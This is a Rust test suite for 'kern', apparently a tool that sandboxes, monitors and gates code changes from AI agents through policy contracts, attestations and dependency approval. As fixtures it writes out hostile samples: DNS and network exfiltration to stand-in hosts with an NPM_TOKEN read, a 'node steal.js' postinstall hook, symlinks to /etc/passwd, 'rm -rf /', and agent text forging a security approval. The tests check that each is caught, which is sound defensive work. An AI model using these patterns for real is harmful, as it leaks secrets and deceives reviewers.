use ed25519_dalek::SigningKey;
use kern::attest::{self, KeySource};
use kern::capability;
use kern::container;
use kern::flow::{self, required_checks};
use kern::git::{self, Entry, Files};
use kern::policy::{self, Contract, Operator, attenuate, contract, contract_digest, operator, verifier_digest};
use std::collections::BTreeSet;
use kern::promote;
use kern::sandbox::{self, Spec};
use kern::util::*;
use serde_json::{Value, json};
use std::path::{Path, PathBuf};
use std::process::Command;

struct Temp(PathBuf);
impl Temp {
    fn new() -> Temp {
        let p = std::env::temp_dir().join(format!("kern-test-{}", uuid4().unwrap()));
        std::fs::create_dir_all(&p).unwrap();
        Temp(p)
    }
    fn join(&self, s: &str) -> PathBuf { self.0.join(s) }
}
impl Drop for Temp {
    fn drop(&mut self) { let _ = std::fs::remove_dir_all(&self.0); }
}
fn sh(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git").args(args).current_dir(dir).env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@t").env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@t").env("GIT_CONFIG_NOSYSTEM", "1").output().unwrap();
    assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}
fn file(text: &str) -> Entry { let b = text.as_bytes().to_vec(); Entry { mode: "100644".into(), oid: git::object_id("blob", &b), size: b.len() as u64, bytes: Some(b) } }
fn files(items: &[(&str, &str)]) -> Files { items.iter().map(|(p, t)| (p.to_string(), file(t))).collect() }
fn policy_value() -> Value {
    json!({ "version": 2, "task": "fix-addition", "filesystem": { "read": ["README.md", "src/", "test/"], "write": ["src/", "test/"] }, "network": [], "secrets": [], "publish": false, "dependencies": null,
        "limits": { "files_changed": 8, "lines_changed": 200, "file_bytes": 65536, "total_bytes": 1048576, "timeout_seconds": 30, "memory_mb": 256, "pids": 64 }, "required_checks": ["addition"] })
}
fn operator_value(executors: &[&str]) -> Value {
    json!({ "version": 3, "repository": "acme/project", "deployment": "single-vm", "executors": executors, "image": format!("sha256:{}", "a".repeat(64)),
        "builders": { "executor": if executors.contains(&"kern-gvisor") { json!("d".repeat(64)) } else { Value::Null }, "verifier": "e".repeat(64) },
        "checks": [{ "id": "addition", "file": std::path::absolute("checks.json").unwrap(), "sha256": "b".repeat(64) }], "registry": "registry.npmjs.org", "permissions": { "test/": ["node:assert"] } })
}

struct Fixture { t: Temp, store: PathBuf, base: String, commit: String, original: Files, candidate: Files, policy: Contract, op: Operator, key: SigningKey, public: String, kern: Value, envelope: Value, run_id: String }
fn kern_payload(policy: &Contract, op: &Operator, run_id: &str, base: &str, commit: &str, manifest: &str, issued: u64) -> Value {
    json!({ "run_id": run_id, "task": policy.task, "repository": op.repository, "base": base, "commit": commit, "manifest_sha256": manifest, "contract_sha256": contract_digest(policy).unwrap(),
        "verifier_sha256": verifier_digest(op).unwrap(), "executor": { "kind": "external", "builder_sha256": null, "source_commit": commit }, "verifier_builder_sha256": op.verifier_builder,
        "deployment": "single-vm", "image": op.image, "runtime": "runsc", "dependencies_sha256": null,
        "checks": required_checks(policy).iter().map(|id| json!({ "id": id, "status": "PASS", "evidence_sha256": "c".repeat(64) })).collect::<Vec<_>>(), "issued_at": issued, "expires_at": issued + 60_000 })
}
fn fixture() -> Fixture {
    let t = Temp::new();
    let store = git::init_store(&t.join("objects.git")).unwrap();
    let original = files(&[("src/add.mjs", "export const add = (a, b) => a - b;\n"), ("README.md", "A fixture\n"), ("test/add.test.mjs", "import assert from 'node:assert';\nimport { add } from '../src/add.mjs';\nassert.equal(add(1, 2), 3);\n")]);
    let base = git::write_commit(&store, &original, None, "fixture").unwrap();
    let mut candidate = original.clone();
    candidate.insert("src/add.mjs".into(), file("export const add = (a, b) => a + b;\n"));
    let policy = contract(&policy_value()).unwrap();
    let op = operator(&operator_value(&["external"])).unwrap();
    let commit = git::write_commit(&store, &candidate, Some(&base), &policy.task).unwrap();
    let manifest = digest(&git::manifest(&store, &commit, 65536, 1048576).unwrap()).unwrap();
    let key = SigningKey::from_bytes(&random_bytes::<32>().unwrap());
    let public = attest::public_pem(&key.verifying_key()).unwrap();
    let run_id = uuid4().unwrap();
    let kern = kern_payload(&policy, &op, &run_id, &base, &commit, &manifest, now_ms() - 1000);
    let envelope = attest::sign(&kern, &KeySource::File(key.clone())).unwrap();
    Fixture { t, store, base, commit, original, candidate, policy, op, key, public, kern, envelope, run_id }
}
fn expected(f: &Fixture) -> Value { json!({ "run_id": f.run_id, "base": f.base, "commit": f.commit, "branch": format!("kern/{}/{}", f.policy.task, f.run_id) }) }
fn denied<T>(r: R<T>, needle: &str) {
    match r { Ok(_) => panic!("expected denial containing {needle:?}"), Err(e) => assert!(e.0.contains(needle), "{:?} does not contain {needle:?}", e.0) }
}

#[test]
fn commits_are_byte_identical_to_git_and_reads_are_exact() {
    let t = Temp::new();
    let repo = t.join("repo");
    std::fs::create_dir_all(repo.join("src/deep/er")).unwrap();
    sh(&t.0, &["init", "-q", "repo"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    for (p, c) in [("README.md", "hi\n"), ("src/a.js", "a\n"), ("src/deep/er/b.ts", "b\n"), ("src/a-b.js", "x\n"), ("src/a.b.js", "y\n"), ("logo@2x.png", "\u{1}\u{2}"), ("docs/Über uns.md", "ü\n")] {
        std::fs::create_dir_all(repo.join(p).parent().unwrap()).unwrap();
        std::fs::write(repo.join(p), c).unwrap();
    }
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let head = sh(&repo, &["rev-parse", "HEAD"]);
    let read = git::read_commit(&repo, &head, 1048576, 16777216).unwrap();
    assert_eq!(read.len(), 7);
    assert_eq!(read["docs/Über uns.md"].bytes.as_deref().unwrap(), "ü\n".as_bytes());
    let mine = git::write_commit(&repo, &read, None, "oracle").unwrap();
    assert_eq!(sh(&repo, &["rev-parse", &format!("{mine}^{{tree}}")]), sh(&repo, &["rev-parse", "HEAD^{tree}"]));
    assert_eq!(git::write_commit(&repo, &read, None, "oracle").unwrap(), mine);
    denied(git::read_commit(&repo, &head, 1048576, 10), "byte limits");
}
#[test]
fn symlinks_submodules_case_collisions_and_reserved_names_are_refused() {
    let t = Temp::new();
    let store = git::init_store(&t.join("s.git")).unwrap();
    for (names, needle) in [(vec!["src/X.js", "src/x.js"], "Case-colliding"), (vec!["a", "a/b"], "collision"), (vec![".git/config"], "Reserved"), (vec!["src/CON.txt"], "Nonportable"), (vec!["a:b"], "Nonportable"), (vec!["a\\b"], "Nonportable")] {
        let fs: Files = names.iter().map(|n| (n.to_string(), file("x"))).collect();
        denied(git::write_commit(&store, &fs, None, "t"), needle);
    }
    let repo = t.join("repo");
    sh(&t.0, &["init", "-q", "repo"]);
    std::fs::write(repo.join("a"), "a").unwrap();
    sh(&repo, &["add", "a"]);
    let blob = sh(&repo, &["hash-object", "-w", "a"]);
    sh(&repo, &["update-index", "--add", "--cacheinfo", &format!("120000,{blob},link")]);
    sh(&repo, &["commit", "-qm", "link"]);
    assert!(git::read_commit(&repo, &sh(&repo, &["rev-parse", "HEAD"]), 1048576, 16777216).unwrap()["link"].link(), "a symlink is carried as a link, never as a file");
}
#[test]
fn shallow_import_and_bundle_handoff_round_trip_and_reject_tampering() {
    let t = Temp::new();
    let repo = t.join("repo");
    sh(&t.0, &["init", "-q", "repo"]);
    std::fs::create_dir_all(repo.join("src")).unwrap();
    for (i, text) in ["one\n", "two\n"].iter().enumerate() {
        std::fs::write(repo.join("src/a.js"), text).unwrap();
        sh(&repo, &["add", "-A"]);
        sh(&repo, &["commit", "-qm", &format!("c{i}")]);
    }
    let base = sh(&repo, &["rev-parse", "HEAD"]);
    let store = git::import_base(&repo, &base, &t.join("exec.git")).unwrap();
    let mut fs = git::read_commit(&store, &base, 1048576, 16777216).unwrap();
    fs.insert("src/a.js".into(), file("three\n"));
    let commit = git::write_commit(&store, &fs, Some(&base), "t").unwrap();
    let run = json!({ "version": 2, "run_id": uuid4().unwrap(), "repository": "acme/project", "base": base, "commit": commit, "contract_sha256": "a".repeat(64),
        "manifest_sha256": digest(&git::manifest(&store, &commit, 1048576, 16777216).unwrap()).unwrap(), "executor": { "kind": "external", "source_commit": commit }, "dependencies": null });
    git::handoff(&store, &run, &t.join("handoff")).unwrap();
    let verifier = git::init_store(&t.join("independent.git")).unwrap();
    sh(&verifier, &["bundle", "verify", t.join("handoff/artifact.bundle").to_str().unwrap()]);
    let imported = git::import_handoff(&t.join("handoff"), &t.join("verifier")).unwrap();
    assert_eq!(imported["status"], "IMPORTED_UNVERIFIED");
    let mut bad = run.clone();
    bad["manifest_sha256"] = json!("b".repeat(64));
    std::fs::create_dir(t.join("tampered")).unwrap();
    std::fs::copy(t.join("handoff/artifact.bundle"), t.join("tampered/artifact.bundle")).unwrap();
    write_json(t.join("tampered/run.json"), &bad).unwrap();
    denied(git::import_handoff(&t.join("tampered"), &t.join("v2")), "manifest mismatch");
    std::fs::create_dir(t.join("corrupt")).unwrap();
    let mut bytes = std::fs::read(t.join("handoff/artifact.bundle")).unwrap();
    let n = bytes.len();
    bytes[n - 30] ^= 0xff;
    std::fs::write(t.join("corrupt/artifact.bundle"), bytes).unwrap();
    std::fs::copy(t.join("handoff/run.json"), t.join("corrupt/run.json")).unwrap();
    assert!(git::import_handoff(&t.join("corrupt"), &t.join("v3")).is_err());
    let mut swapped = run.clone();
    swapped["base"] = json!(commit);
    swapped["commit"] = json!(base);
    std::fs::create_dir(t.join("swapped")).unwrap();
    std::fs::copy(t.join("handoff/artifact.bundle"), t.join("swapped/artifact.bundle")).unwrap();
    write_json(t.join("swapped/run.json"), &swapped).unwrap();
    denied(git::import_handoff(&t.join("swapped"), &t.join("v4")), "exactly the run base and candidate");
}
#[test]
fn change_gate_enforces_grants_protected_paths_budgets_and_text() {
    let f = fixture();
    assert_eq!(git::changes(&f.original, &f.candidate, &f.policy).unwrap()["lines_changed"], 2);
    for (name, needle) in [("README.md", "outside contract"), ("src/package.json", "Protected"), ("src/.npmrc", "Protected"), ("src/.github/workflows/a.yml", "Protected"), ("src/.env.local", "Protected"), ("src/node_modules/x.js", "Protected")] {
        let mut c = f.candidate.clone();
        c.insert(name.into(), file("x"));
        denied(git::changes(&f.original, &c, &f.policy), needle);
    }
    let mut c = f.candidate.clone();
    c.insert("src/bin.dat".into(), { let b = vec![0u8, 1]; Entry { mode: "100644".into(), oid: git::object_id("blob", &b), size: 2, bytes: Some(b) } });
    denied(git::changes(&f.original, &c, &f.policy), "Binary");
    let mut tight = policy_value();
    tight["limits"]["lines_changed"] = json!(1);
    denied(git::changes(&f.original, &f.candidate, &contract(&tight).unwrap()), "budget");
    let long: String = (1..=1000).map(|i| format!("export const v{i} = {i};\n")).collect();
    let edited = long.replacen("export const v1 = 1;", "export const v1 = 0;", 1).replacen("export const v1000 = 1000;", "export const v1000 = 0;", 1);
    tight["limits"]["lines_changed"] = json!(10);
    let (before, after) = (files(&[("src/long.mjs", &long)]), files(&[("src/long.mjs", &edited)]));
    assert_eq!(git::changes(&before, &after, &contract(&tight).unwrap()).unwrap()["lines_changed"], 4);
    let moved: String = long.lines().skip(10).chain(long.lines().take(10)).map(|l| format!("{l}\n")).collect();
    assert_eq!(git::changes(&before, &files(&[("src/long.mjs", &moved)]), &contract(&policy_value()).unwrap()).unwrap()["lines_changed"], 20);
    let rewritten: String = (1..=1000).map(|i| format!("export const w{i} = {i};\n")).collect();
    denied(git::changes(&before, &files(&[("src/long.mjs", &rewritten)]), &contract(&tight).unwrap()), "1 file and more than 10 lines changed; the contract allows");
}
#[test]
fn symlinks_and_submodules_ride_along_unchanged_and_never_reach_the_sandbox() {
    let t = Temp::new();
    let repo = t.join("r");
    sh(&t.0, &["init", "-q", "r"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    std::fs::create_dir_all(repo.join("src")).unwrap();
    std::fs::write(repo.join("src/a.js"), "module.exports = 1;\n").unwrap();
    sh(&repo, &["add", "-A"]);
    let link = git::trimmed(git::git(&repo, &["hash-object", "-w", "--stdin"], Some(b"../src/a.js")).unwrap());
    sh(&repo, &["update-index", "--add", "--cacheinfo", &format!("120000,{link},docs/a.js")]);
    sh(&repo, &["update-index", "--add", "--cacheinfo", &format!("160000,{},vendor/lib", "e".repeat(40))]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = sh(&repo, &["rev-parse", "HEAD"]);
    let files = git::read_commit(&repo, &base, 65536, 1048576).unwrap();
    let (l, s) = (&files["docs/a.js"], &files["vendor/lib"]);
    assert!(l.link() && s.link() && !files["src/a.js"].link() && l.bytes.is_none() && s.bytes.is_none(), "links are carried, never read as code");
    let again = git::write_commit(&repo, &files, None, "x").unwrap();
    assert_eq!(sh(&repo, &["rev-parse", &format!("{again}^{{tree}}")]), sh(&repo, &["rev-parse", &format!("{base}^{{tree}}")]));
    let manifest = git::manifest(&repo, &base, 65536, 1048576).unwrap();
    assert!(manifest["files"].as_array().unwrap().iter().any(|f| f["path"] == "vendor/lib" && f["commit"] == "e".repeat(40)), "{manifest}");
    git::materialize(Some(&repo), &files, &t.join("snap"), None).unwrap();
    assert!(t.join("snap/src/a.js").exists() && !t.join("snap/docs/a.js").exists() && !t.join("snap/vendor/lib").exists());
    let mut policy = policy_value();
    policy["filesystem"] = json!({ "read": ["src/", "docs/", "vendor/"], "write": ["src/", "docs/", "vendor/"] });
    let policy = contract(&policy).unwrap();
    let mut edit = files.clone();
    edit.insert("src/a.js".into(), file("module.exports = 2;\n"));
    git::changes(&files, &edit, &policy).unwrap();
    let mut retarget = files.clone();
    retarget.insert("docs/a.js".into(), Entry { mode: "120000".into(), oid: git::object_id("blob", b"/etc/passwd"), size: 11, bytes: None });
    let mut added = files.clone();
    added.insert("src/b.js".into(), Entry { mode: "120000".into(), oid: git::object_id("blob", b"../../secret"), size: 12, bytes: None });
    let mut removed = files.clone();
    removed.remove("vendor/lib");
    let mut replaced = files.clone();
    replaced.insert("docs/a.js".into(), file("now a file\n"));
    for c in [&retarget, &added, &removed, &replaced] { denied(git::changes(&files, c, &policy), "Symlinks and submodules cannot change"); }
    let ws = t.join("ws");
    git::materialize(Some(&repo), &files, &ws, None).unwrap();
    let back = kern::local::read_workspace(&ws, &files, 65536, 1048576).unwrap();
    assert_eq!(back.get("docs/a.js").map(|e| &e.oid), Some(&link));
    assert!(git::changes(&files, &back, &policy).unwrap()["files"].as_array().unwrap().is_empty());
}
#[test]
fn step_summary_keeps_agent_text_inside_a_code_block() {
    let s = promote::step_summary(&Err(Denied("Patch widens module capabilities: escape:../![x](https://evil.invalid/p.png)\n```\n# Approved by security\n<img src=x>".into())));
    assert!(s.starts_with("### kern-verified: DENIED\n\n"), "{s}");
    for line in s.lines().skip(2).filter(|l| !l.is_empty()) { assert!(line.starts_with("    "), "{line:?} escapes the code block"); }
    let ok = promote::step_summary(&Ok(json!({ "status": "PASS", "head": "```\n# injected" })));
    assert!(ok.starts_with("### kern-verified: PASS\n\n") && ok.lines().skip(2).filter(|l| !l.is_empty()).all(|l| l.starts_with("    ")), "{ok}");
}

#[test]
fn a_closed_output_pipe_is_not_a_crash() {
    for args in [vec!["--help"], vec!["--version"]] {
        let mut child = Command::new(env!("CARGO_BIN_EXE_kern")).args(&args).stdout(std::process::Stdio::piped()).stderr(std::process::Stdio::piped()).spawn().unwrap();
        drop(child.stdout.take());
        let out = child.wait_with_output().unwrap();
        assert!(!String::from_utf8_lossy(&out.stderr).contains("panicked"), "{args:?}: {}", String::from_utf8_lossy(&out.stderr));
    }
}

#[test]
fn behaviour_monitor_records_network_processes_and_environment_reads() {
    let t = Temp::new();
    std::fs::write(t.join("monitor.cjs"), sandbox::MONITOR).unwrap();
    let script = "fetch('http://telemetry.invalid:8080/x').catch(()=>{}); require('net').connect(9, '127.0.0.1').on('error',()=>{}); \
        require('child_process').spawnSync(process.execPath, ['-v']); try { require('child_process').execSync('curl-not-installed --version', { stdio: 'ignore' }); } catch {} \
        require('child_process').spawnSync('/opt/my tools/runner', ['-v']); try { require('child_process').execSync('\"/opt/my tools/quoted\" --flag', { stdio: 'ignore' }); } catch {} \
        require('child_process').spawnSync('shell-command-not-installed --x', { shell: true, stdio: 'ignore' }); \
        process.env.NPM_TOKEN; Object.keys(process.env); process.env.X = '1'; delete process.env.X; setTimeout(() => {}, 300); \
        const dns = require('dns'); dns.resolveTxt('secret.exfil.invalid', () => {}); dns.promises.resolve4('p.exfil.invalid').catch(() => {}); new dns.Resolver().resolveMx('r.exfil.invalid', () => {});";
    let out = Command::new("node").arg("--require").arg(t.join("monitor.cjs")).arg("-e").arg(script).env("KERN_MONITOR", t.join("log")).output().unwrap();
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    let log = std::fs::read_to_string(t.join("log")).unwrap();
    for want in ["net:telemetry.invalid:8080", "net:loopback", "exec:node", "exec:curl-not-installed", "exec:runner", "exec:quoted", "exec:shell-command-not-installed", "env:NPM_TOKEN", "env:*", "dns:secret.exfil.invalid", "dns:p.exfil.invalid", "dns:r.exfil.invalid"] { assert!(log.lines().any(|l| l == want), "missing {want} in:\n{log}"); }
    let quiet = Command::new("node").arg("--require").arg(t.join("monitor.cjs")).arg("-e").arg("process.env.NPM_TOKEN").output().unwrap();
    assert!(quiet.status.success() && quiet.stdout.is_empty() && quiet.stderr.is_empty());
}

#[test]
fn behaviour_diff_blocks_new_reach_and_contracts_can_allow_it() {
    let set = |items: &[&str]| items.iter().map(|s| s.to_string()).collect::<std::collections::BTreeSet<_>>();
    let base = set(&["exec:sh", "env:NODE_ENV", "net:loopback"]);
    let candidate = set(&["exec:sh", "env:NODE_ENV", "net:loopback", "net:ipc", "env:DEBUG", "env:NPM_TOKEN", "net:telemetry.example:443", "dns:telemetry.example", "exec:curl", "env:*"]);
    let (new, blocking) = flow::behavior_diff(&base, &candidate, &[]);
    assert_eq!(new.len(), 7);
    assert_eq!(blocking, vec!["dns:telemetry.example", "env:*", "env:NPM_TOKEN", "exec:curl", "net:telemetry.example:443"]);
    let (_, blocking) = flow::behavior_diff(&base, &candidate, &["exec:curl".into(), "net:telemetry.example:443".into(), "dns:telemetry.example".into()]);
    assert_eq!(blocking, vec!["env:*", "env:NPM_TOKEN"]);
    let mut v3 = policy_value();
    v3["version"] = json!(3);
    v3["behaviors"] = json!(["net:api.example.com:443", "exec:git"]);
    let c = contract(&v3).unwrap();
    assert_eq!(c.behaviors, vec!["exec:git".to_string(), "net:api.example.com:443".into()]);
    let mut bad = v3.clone();
    bad["behaviors"] = json!(["shell:rm -rf /"]);
    denied(contract(&bad), "behaviors");
    let mut wider = v3.clone();
    wider["behaviors"] = json!(["exec:git", "exec:curl"]);
    denied(attenuate(&v3, &wider), "runtime behavior");
    assert!(required_checks(&c).contains(&"behavior".to_string()));
}

fn control_file(t: &Temp, role: &str) -> PathBuf {
    let git = if cfg!(windows) { PathBuf::from(r"C:\Program Files\Git\cmd\git.exe") } else { PathBuf::from("/usr/bin/git") };
    let pin = json!({ "file": git, "sha256": sha256(std::fs::read(&git).unwrap()) });
    let c = json!({ "version": 1, "role": role, "docker": { "file": pin["file"], "sha256": pin["sha256"], "endpoint": policy::ENDPOINT }, "git": pin, "host_policy": pin,
        "runtime": { "file": "/usr/local/bin/runsc", "sha256": "a".repeat(64), "version": "fixture", "arguments": [] } });
    let path = t.join(&format!("{role}-control.json"));
    std::fs::write(&path, c.to_string()).unwrap();
    path
}
#[test]
fn hosted_verifier_serves_profiles_and_verifies_only_authorised_known_runs() {
    let f = fixture();
    let (private, public) = attest::keypair().unwrap();
    let svc = f.t.join("svc");
    std::fs::create_dir_all(svc.join("tasks")).unwrap();
    std::fs::write(svc.join("operator.json"), operator_value(&["external"]).to_string()).unwrap();
    std::fs::write(svc.join("tasks/fix-addition.json"), policy_value().to_string()).unwrap();
    std::fs::write(svc.join("signer.pem"), &private).unwrap();
    let profile = kern::init::profile(&operator_value(&["external"]), &public).unwrap();
    std::fs::write(svc.join("profile.json"), profile.to_string()).unwrap();
    let token = "t0k3n-for-acme";
    std::fs::write(svc.join("serve.json"), json!({ "version": 1, "listen": "127.0.0.1:0", "signer": "signer.pem", "profile": "profile.json", "work": "work",
        "repositories": { "acme/project": { "operator": "operator.json", "tasks": "tasks", "token_sha256": [sha256(token)] } } }).to_string()).unwrap();
    struct Killed(std::process::Child);
    impl Drop for Killed { fn drop(&mut self) { let _ = self.0.kill(); let _ = self.0.wait(); } }
    let mut server = Killed(Command::new(env!("CARGO_BIN_EXE_kern")).arg("--control").arg(control_file(&f.t, "verifier")).arg("serve").arg(svc.join("serve.json"))
        .stdout(std::process::Stdio::piped()).stderr(std::process::Stdio::null()).spawn().unwrap());
    let mut line = String::new();
    std::io::BufRead::read_line(&mut std::io::BufReader::new(server.0.stdout.take().unwrap()), &mut line).unwrap();
    let url = format!("http://{}", serde_json::from_str::<Value>(&line).unwrap()["address"].as_str().unwrap());
    let agent: ureq::Agent = ureq::Agent::config_builder().http_status_as_error(false).build().into();
    let get = |p: &str| { let mut r = agent.get(&format!("{url}{p}")).call().unwrap(); (r.status().as_u16(), serde_json::from_str::<Value>(&r.body_mut().read_to_string().unwrap()).unwrap()) };
    let post = |tok: &str, body: &Value| { let mut r = agent.post(&format!("{url}/v1/verify")).header("Authorization", &format!("Bearer {tok}")).send(body.to_string()).unwrap(); (r.status().as_u16(), serde_json::from_str::<Value>(&r.body_mut().read_to_string().unwrap()).unwrap()) };
    assert_eq!(get("/healthz").0, 200);
    assert_eq!(get("/v1/profile").1, profile);
    assert_eq!(kern::init::load_profile(&url).unwrap(), profile, "kern init can read the profile from the service");
    let run = json!({ "version": 2, "run_id": uuid4().unwrap(), "repository": "acme/project", "base": f.base, "commit": f.commit, "contract_sha256": contract_digest(&f.policy).unwrap(),
        "manifest_sha256": digest(&git::manifest(&f.store, &f.commit, 65536, 1048576).unwrap()).unwrap(), "executor": { "kind": "external", "source_commit": f.commit }, "dependencies": null });
    git::handoff(&f.store, &run, &f.t.join("handoff")).unwrap();
    let body = json!({ "run": run, "bundle": b64(&std::fs::read(f.t.join("handoff/artifact.bundle")).unwrap()) });
    assert_eq!(post("wrong", &body).0, 401);
    let mut raw = std::net::TcpStream::connect(url.trim_start_matches("http://")).unwrap();
    raw.set_read_timeout(Some(std::time::Duration::from_secs(5))).unwrap();
    std::io::Write::write_all(&mut raw, b"POST /v1/verify HTTP/1.1\r\nHost: x\r\nContent-Length: 100000000\r\n\r\n").unwrap();
    let mut reply = String::new();
    let _ = std::io::Read::read_to_string(&mut raw, &mut reply);
    assert!(reply.starts_with("HTTP/1.1 401"), "{reply:?}");
    let mut other = body.clone();
    other["run"]["repository"] = json!("evil/project");
    let (code, r) = post(token, &other);
    assert!(code == 422 && r["reason"].as_str().unwrap().contains("does not serve"), "{r}");
    let mut stale = body.clone();
    stale["run"]["contract_sha256"] = json!("c".repeat(64));
    assert!(post(token, &stale).1["reason"].as_str().unwrap().contains("No trusted task contract"));
    let (code, r) = post(token, &body);
    assert!(code == 422 && r["reason"].as_str().unwrap().contains("Verifier builder identity"), "{r}");
    if container_ready() {
        std::fs::write(f.t.join("task.json"), policy_value().to_string()).unwrap();
        std::fs::write(f.t.join("token.txt"), format!("{token}\n")).unwrap();
        std::fs::create_dir_all(f.t.join("keys")).unwrap();
        std::fs::write(f.t.join("keys/verifier.pub"), &public).unwrap();
        let job = json!({ "version": 2, "repo": f.store, "base": f.base, "contract": "./task.json", "image": NODE, "network": false, "output": f.t.join("runs"), "promote": false,
            "command": ["/usr/local/bin/node", "-e", "require('fs').writeFileSync('src/add.mjs', 'export const add = (a, b) => a + b;\\n')"],
            "verifier": { "url": url, "token_file": "./token.txt", "public_key": "./keys/verifier.pub", "operator": "./svc/operator.json" } });
        std::fs::write(f.t.join("run.json"), job.to_string()).unwrap();
        let r = kern::local::local_run(&kern::local::run_job(&f.t.join("run.json")).unwrap()).unwrap();
        assert_eq!(r["status"], "BLOCKED", "{r}");
        assert!(r["reason"].as_str().unwrap().contains("Verifier builder identity"), "{r}");
    }
}

fn npm_manifest(deps: &[(&str, &str)], scripts: Value) -> String {
    serde_json::to_string_pretty(&json!({ "name": "app", "version": "1.0.0", "scripts": scripts, "dependencies": deps.iter().map(|(n, v)| (n.to_string(), json!(v))).collect::<serde_json::Map<_, _>>() })).unwrap()
}
fn npm_lock(root: &[(&str, &str)], packages: &[(&str, &str, &[&str])]) -> String {
    let mut map = serde_json::Map::new();
    map.insert(String::new(), json!({ "name": "app", "version": "1.0.0", "dependencies": root.iter().map(|(n, v)| (n.to_string(), json!(v))).collect::<serde_json::Map<_, _>>() }));
    for (name, version, deps) in packages {
        let file = name.rsplit('/').next().unwrap_or(name);
        map.insert(format!("node_modules/{name}"), json!({ "version": version, "resolved": format!("https://registry.npmjs.org/{name}/-/{file}-{version}.tgz"), "integrity": "sha512-abc",
            "dependencies": deps.iter().map(|d| (d.to_string(), json!("*"))).collect::<serde_json::Map<_, _>>() }));
    }
    serde_json::to_string_pretty(&json!({ "name": "app", "version": "1.0.0", "lockfileVersion": 3, "requires": true, "packages": map })).unwrap()
}
#[test]
fn agents_change_dependencies_only_for_packages_the_task_approves() {
    let mut v = policy_value();
    v["dependencies"] = json!({ "manager": "npm", "lockfile": "package-lock.json", "allow": ["zod", "@types/*"] });
    let c = contract(&v).unwrap();
    assert_eq!(c.approved, vec!["@types/*".to_string(), "zod".to_string()]);
    for bad in [json!(["Zod"]), json!(["../x"]), json!(["@scope"]), json!(["zod", "zod"]), json!([""]), json!(["*"])] {
        let mut b = v.clone();
        b["dependencies"]["allow"] = bad;
        denied(contract(&b), "dependencies.allow");
    }
    let mut narrower = v.clone();
    narrower["dependencies"]["allow"] = json!(["zod"]);
    attenuate(&v, &narrower).unwrap();
    denied(attenuate(&narrower, &v), "approve");
    let scripts = json!({ "test": "mocha" });
    let lodash = [("lodash", "4.17.20", &[][..])];
    let base = files(&[("package.json", &npm_manifest(&[("lodash", "^4.17.0")], scripts.clone())), ("package-lock.json", &npm_lock(&[("lodash", "^4.17.0")], &lodash)), ("src/a.js", "module.exports = 1;\n")]);
    let with = |manifest: &str, lock: &str, code: &str| { let mut f = base.clone(); f.insert("package.json".into(), file(manifest)); f.insert("package-lock.json".into(), file(lock)); f.insert("src/a.js".into(), file(code)); f };
    let zod_manifest = npm_manifest(&[("lodash", "^4.17.0"), ("zod", "^3.0.0")], scripts.clone());
    let zod_lock = npm_lock(&[("lodash", "^4.17.0"), ("zod", "^3.0.0")], &[("lodash", "4.17.20", &[]), ("zod", "3.23.0", &["zod-helper"]), ("zod-helper", "1.0.0", &[])]);
    let ok = with(&zod_manifest, &zod_lock, "const z = require('zod');\nmodule.exports = z;\n");
    let changed = git::changes(&base, &ok, &c).unwrap();
    assert_eq!(changed["dependencies"]["approved"], json!(["zod"]), "{changed}");
    capability::check(&base, &ok, &changed, &std::collections::BTreeMap::new()).unwrap();
    let mut strict = v.clone();
    strict["dependencies"] = json!({ "manager": "npm", "lockfile": "package-lock.json" });
    denied(git::changes(&base, &ok, &contract(&strict).unwrap()), "package-lock.json");
    let pad = with(&npm_manifest(&[("lodash", "^4.17.0"), ("left-pad", "^1.0.0")], scripts.clone()), &npm_lock(&[("lodash", "^4.17.0"), ("left-pad", "^1.0.0")], &[("lodash", "4.17.20", &[]), ("left-pad", "1.3.0", &[])]), "module.exports = 1;\n");
    denied(git::changes(&base, &pad, &c), "Dependency change not approved: left-pad");
    let told = kern::feedback::explain(&reason(git::changes(&base, &pad, &c)), Some(&c));
    assert!(told["agent_fixable"] == true && told["violations"][0]["rule"] == "dependency" && told["violations"][0]["instruction"].as_str().unwrap().contains("`left-pad`"), "{told}");
    let hook = with(&npm_manifest(&[("lodash", "^4.17.0"), ("zod", "^3.0.0")], json!({ "test": "mocha", "postinstall": "node steal.js" })), &zod_lock, "module.exports = 1;\n");
    denied(git::changes(&base, &hook, &c), "package.json may only change dependency entries, but this change touches: scripts");
    let moved = with(&zod_manifest, &npm_lock(&[("lodash", "^4.17.0"), ("zod", "^3.0.0")], &[("lodash", "4.17.21", &[]), ("zod", "3.23.0", &["zod-helper"]), ("zod-helper", "1.0.0", &[])]), "module.exports = 1;\n");
    denied(git::changes(&base, &moved, &c), "The lockfile changes packages the task did not approve: lodash");
    let mut reformatted: Value = serde_json::from_str(&zod_lock).unwrap();
    reformatted["lockfileVersion"] = json!(2);
    denied(git::changes(&base, &with(&zod_manifest, &reformatted.to_string(), "module.exports = 1;\n"), &c), "The lockfile format changed");
    let bumped = with(&zod_manifest, &npm_lock(&[("lodash", "^4.17.0"), ("zod", "^3.0.0")], &[("lodash", "4.17.20", &[]), ("zod", "3.23.8", &["zod-helper"]), ("zod-helper", "1.0.0", &[])]), "module.exports = 1;\n");
    git::changes(&ok, &bumped, &c).unwrap();
    let types = with(&npm_manifest(&[("lodash", "^4.17.0"), ("@types/node", "^22.0.0")], scripts.clone()), &npm_lock(&[("lodash", "^4.17.0"), ("@types/node", "^22.0.0")], &[("lodash", "4.17.20", &[]), ("@types/node", "22.0.0", &[])]), "module.exports = 1;\n");
    assert_eq!(git::changes(&base, &types, &c).unwrap()["dependencies"]["approved"], json!(["@types/node"]));
    let sneaky = with(&zod_manifest, &zod_lock, "const pad = require('left-pad');\nmodule.exports = pad;\n");
    let changed = git::changes(&base, &sneaky, &c).unwrap();
    denied(capability::check(&base, &sneaky, &changed, &std::collections::BTreeMap::new()), "package:left-pad");
}

#[test]
fn dependency_installs_are_reused_only_for_the_same_manifests_registry_and_image() {
    use kern::flow::DepsCache;
    let t = Temp::new();
    let cache = DepsCache::at(t.join("cache"), 2);
